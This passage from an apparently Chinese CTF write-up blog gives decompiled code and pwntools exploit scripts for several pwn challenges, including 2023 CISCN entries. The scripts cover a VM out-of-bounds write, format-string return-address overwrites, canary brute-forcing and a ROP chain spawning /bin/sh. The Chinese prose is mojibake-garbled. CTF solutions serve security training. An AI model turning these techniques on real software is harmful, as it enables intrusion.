class="keyword">goto</span> LABEL_22;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_8480 || i == <span class="number">4096</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  *(&amp;unk_4080 + <span class="number">2</span> * i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm å…³é”®ä»£ç å¦‚ä¸‹ï¼Œè§£é‡Šçš„ä¾¿æ˜¯ bss æ®µä¸Šç¿»è¯‘åçš„å€¼ï¼Œå¯ä»¥å‘ç°v3å¯ä»¥å‡ä¸ºè´Ÿå€¼ï¼Œå› æ­¤å°±å¯ä»¥ä½¿å…¶æŒ‡å‘è¿”å›åœ°å€ï¼Œä½¿ä¹‹å¢åŠ è‡³è¿”å›åœ°å€å¤„ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202307271930237.png" alt="image-20230727193030123"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_151D</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int16 v2; <span class="comment">// [rsp+12h] [rbp-Eh]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0xFFFF</span>;                                </span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( --v3 )<span class="comment">// å¾ªç¯ç»“æŸv3ç½®é›¶</span></span><br><span class="line">    *(<span class="number">2LL</span> * v3 + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;unk_4080 + <span class="number">2</span> * v2) &amp;&amp; v3 &lt;= <span class="number">65534</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *(&amp;unk_4080 + <span class="number">2</span> * v2) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:                                 <span class="comment">// !</span></span><br><span class="line">          ++v3;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:                                 <span class="comment">// iâ€”â€”å¯è¶Šç•Œ</span></span><br><span class="line">          --v3;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:                                 <span class="comment">// $</span></span><br><span class="line">          ++*(<span class="number">2LL</span> * v3 + a1);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:                                 <span class="comment">// #</span></span><br><span class="line">          --*(<span class="number">2LL</span> * v3 + a1);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:                                 <span class="comment">// x</span></span><br><span class="line">          <span class="built_in">putchar</span>(*(<span class="number">2LL</span> * v3 + a1));</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:                                 <span class="comment">// yâ€”â€”å†™å…¥</span></span><br><span class="line">          *(<span class="number">2</span> * v3 + a1) = getchar();</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:                                 <span class="comment">// *</span></span><br><span class="line">          <span class="keyword">if</span> ( !*(<span class="number">2LL</span> * v3 + a1) )</span><br><span class="line">            v2 = word_4082[<span class="number">2</span> * v2];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">          <span class="keyword">if</span> ( *(<span class="number">2LL</span> * v3 + a1) )</span><br><span class="line">            v2 = word_4082[<span class="number">2</span> * v2];</span><br><span class="line">LABEL_17:</span><br><span class="line">          ++v2;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v3 == <span class="number">0xFFFF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Give me your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">contents</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Give me your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;text: &quot;</span>, contents)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trans</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Give me your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vm</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Give me your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bf&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">100</span>)</span><br><span class="line">edit(<span class="string">&quot;iiii&quot;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">55</span>)</span><br><span class="line">trans()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b *$rebase(0x015c2)&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b *$rebase(0x0016F6)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">vm()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šå¥‡æ€ªçš„ä¸€ç‚¹æ˜¯å½“<code>i</code>æ‰§è¡Œå®Œå»æ‰§è¡Œ<code>$</code>çš„æ—¶å€™ä¼šåæ‰ä¸€ä¸ª<code>$</code>ã€‚</p><h2 id="6-fooooood"><a href="#6-fooooood" class="headerlink" title="6. fooooood"></a>6. fooooood</h2><p>éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæœ‰ä¸‰æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æœºä¼šã€‚åœ¨æ ˆä¸Šæ‰¾åˆ°äºŒå±‚è·³æ¿ï¼Œä¾¿èƒ½éš”å±±æ‰“ç‰›ï¼Œä½†æ˜¯ä¸‰æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿˜å¤ªå°‘ï¼Œå› æ­¤å¾—å…ˆå¢åŠ æ ¼å¼åŒ–çš„æ¬¡æ•°ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>ä¿®æ”¹æ ˆä¸Šçš„<code>i</code></li><li>ä¿®æ”¹è¿”å›åœ°å€</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io, <span class="string">&quot;b *$rebase(0x0B05)&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me your name:&quot;</span>, <span class="string">&#x27;%p&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$p,%11$p&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">lb = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">240</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack ==&gt; &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">11</span>+<span class="number">0x1f</span>-<span class="number">5</span></span><br><span class="line">ret_addr = stack - <span class="number">0x7ffce385cb48</span> + <span class="number">0x7ffce385ca68</span></span><br><span class="line">log.success(<span class="string">&quot;ret_addr ==&gt; &quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">one_gadget = lb + <span class="number">0x45226</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget ==&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">i_addr = ret_addr - <span class="number">20</span></span><br><span class="line">off = i_addr &amp; <span class="number">0xffff</span></span><br><span class="line">off1 = ret_addr &amp; <span class="number">0xffff</span></span><br><span class="line">off2 = one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">off3 = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">log.success(<span class="string">&quot;i_addr ==&gt; &quot;</span>+<span class="built_in">hex</span>(i_addr))</span><br><span class="line">log.success(<span class="string">&quot;off1 ==&gt; &quot;</span>+<span class="built_in">hex</span>(off1))</span><br><span class="line">log.success(<span class="string">&quot;off2 ==&gt; &quot;</span>+<span class="built_in">hex</span>(off2))</span><br><span class="line">log.success(<span class="string">&quot;off3 ==&gt; &quot;</span>+<span class="built_in">hex</span>(off3))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹iå€¼</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off)</span><br><span class="line">payload += <span class="string">&#x27;%11$hn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">&#x27;%6c&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%37$hhn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">dbg()</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off1)</span><br><span class="line">payload += <span class="string">&#x27;%11$hn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off2)</span><br><span class="line">payload += <span class="string">&#x27;%37$hn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off1+<span class="number">2</span>)</span><br><span class="line">payload += <span class="string">&#x27;%11$hn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(off3)</span><br><span class="line">payload += <span class="string">&#x27;%37$hhn&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;your favourite food: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023Ciscnåˆèµ›"><a href="#2023Ciscnåˆèµ›" class="headerlink" title="2023Ciscnåˆèµ›"></a>2023Ciscnåˆèµ›</h1><h2 id="1-funcanary"><a href="#1-funcanary" class="headerlink" title="1. funcanary"></a>1. funcanary</h2><p>é¢˜ç›®æ¯”è¾ƒå¥½æ‡‚ï¼Œé˜»å¡ä¸»è¿›ç¨‹ï¼Œä¸æ–­åˆ†é…å­çº¿ç¨‹è¿›å…¥æ ˆæº¢å‡ºï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111712221.png" alt="image-20230911171256148" style="zoom:50%;" /><p>æœ‰ä¸ªåé—¨ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111727373.png" alt="image-20230911172724228" style="zoom:50%;" /><p>ç”±äºå­è¿›ç¨‹å’Œä¸»è¿›ç¨‹æ˜¯å…±äº« canary çš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å­è¿›ç¨‹ä¸æ–­çˆ†ç ´å¾—åˆ° canaryï¼Œç„¶åçˆ†ç ´å€’æ•°ç¬¬äºŒä½çš„è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°,ï¼Œéœ€è¦æ³¨æ„è¿”å›åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&quot;./service&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x1229</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span> + canary + p8(j)</span><br><span class="line">        io.sendafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line">        info = io.recvuntil(<span class="string">b&quot;welcome&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;stack smashing detected&#x27;</span> <span class="keyword">in</span> info:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            canary += p8(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">log.success(<span class="string">&quot;canary===&gt;&quot;</span>+<span class="built_in">hex</span>(u64(canary)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload += p8(<span class="number">0x2E</span>) + p8(i)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line">    info = io.recvuntil(<span class="string">b&#x27;welcome&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> info:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-çƒ§çƒ¤æ‘Šå„¿"><a href="#2-çƒ§çƒ¤æ‘Šå„¿" class="headerlink" title="2. çƒ§çƒ¤æ‘Šå„¿"></a>2. çƒ§çƒ¤æ‘Šå„¿</h2><p>å¥½ä¹…æ²¡ç¢°åˆ°é™æ€é“¾æ¥çš„é¢˜ç›®äº†ã€‚</p><p>èœå•é¢˜ï¼Œæœ‰ä¸€ä¸ªæ¼æ´åé—¨ï¼Œå¯¼è‡´äº†æ ˆæº¢å‡ºï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121517522.png" alt="image-20230912151719396" style="zoom:50%;" /><p>è¦è¿›å…¥è¿™ä¸ªæ¼æ´åé—¨éœ€è¦è¶³å¤Ÿçš„ moneyï¼Œè€Œç”¨æˆ·åˆå§‹åªæœ‰ 233ã€‚ç”±äºåœ¨ä¹°çƒ§çƒ¤çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯ int å˜é‡ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¾“å…¥è´Ÿæ•°ï¼Œä½¿å¾— money å¢åŠ ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121519850.png" alt="image-20230912151950671" style="zoom:50%;" /><p>é™æ€é“¾æ¥ä¸­æ®‹ç•™äº†å¾ˆå¤š gadgetï¼Œè¶³å¤Ÿæˆ‘ä»¬æ‰“<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;-100000&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *0x401F8D&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000458827</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000040264f</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000040a67e</span></span><br><span class="line">pop_rdx_rbx_ret = <span class="number">0x00000000004a404b</span></span><br><span class="line">syscall = <span class="number">0x0000000000402404</span></span><br><span class="line">name = <span class="number">0x4E60F0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">5</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(name)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx_ret) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-shellwego"><a href="#3-shellwego" class="headerlink" title="3. shellwego"></a>3. shellwego</h2><p>ä¸€é“ go è¯­è¨€ç¼–å†™çš„é¢˜ç›®ï¼Œè„±å»äº†ç¬¦å·è¡¨ï¼Œååˆ†éš¾åˆ†æã€‚å‚è€ƒäº†å¥½å‡ ä½å¤§ä½¬çš„ wpï¼Œè¿˜æ˜¯æ¯”è¾ƒéš¾æ‡‚ï¼ˆçœŸçš„ä¸ä¼šæ‰‹æ’•æ±‡ç¼–ğŸ˜­ï¼‰ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121555457.png" alt="image-20230912155552373" style="zoom:50%;" /><p>å› æ­¤ä½¿ç”¨äº†ä¸€ä¸ªå¼€æº go è¯­è¨€æ¢å¤ç¬¦å·è¡¨çš„é¡¹ç›®ï¼š<a href="https://github.com/0xjiayu/go_parser">go_parser</a>ã€‚<code>alt+f7</code>æ‰“å¼€<code>go_parser.py</code>å³å¯æ¢å¤å¤§éƒ¨åˆ†ç¬¦å·è¡¨ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121600623.png" alt="image-20230912160020250" style="zoom:50%;" /><p>è™½è¯´æ¢å¤äº†å¤§éƒ¨åˆ†ç¬¦å·è¡¨ï¼Œä½†æœ‰çš„éƒ¨åˆ†ä»éœ€è¦ç»“åˆæ±‡ç¼–è¯­è¨€è¿›è¡Œåˆ†æã€‚go çš„ä¸»å‡½æ•°æ˜¯ main_mainï¼Œæ˜¯å¯ä»¥åæ±‡ç¼–çš„ï¼Œä½†å…¶å®å¾ˆå¤šä¿¡æ¯åªæœ‰åœ¨æ±‡ç¼–çª—å£æ‰èƒ½çœ‹åˆ°ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121610813.png" alt="image-20230912161044473" style="zoom:50%;" /><p>ç»“åˆç¨‹åºçš„å®é™…è¿è¡Œæƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºä¸€äº›å‡½æ•°çš„å¤§è‡´åŠŸèƒ½ï¼Œä» main_main çš„è¿è¡Œé€»è¾‘æ¥çœ‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121618148.png" alt="image-20230912161858088" style="zoom:50%;" /><p>æ¥ä¸‹æ¥è¿›å…¥ä¸€ä¸ªå…³é”®å‡½æ•°ï¼ŒåŒæ—¶æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸²åƒåœ¾å­—ç¬¦ä¸²ï¼Œç¨‹åºæŠ¥å‡º<code>Cert Is A Must</code>é”™è¯¯ï¼Œè¯´æ˜æˆ‘ä»¬éœ€è¦è®¤è¯ï¼Œæˆ‘ä»¬è¿›å…¥å…³é”®å‡½æ•°çœ‹çœ‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121628912.png" alt="image-20230912162823858" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121716719.png" alt="image-20230912171617567" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121719124.png" alt="image-20230912171949924" style="zoom:50%;" /><p>åœ¨ç›®æ ‡å‡½æ•°ä¸­æœ‰ä¸ª RC4 åŠ å¯†ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121723974.png" alt="image-20230912172355920" style="zoom:50%;" /><p>è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*- UTF-8 -*- #</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@filename:rc4_exp.py</span></span><br><span class="line"><span class="string">@author:Anza</span></span><br><span class="line"><span class="string">@time:2023-09-12</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span 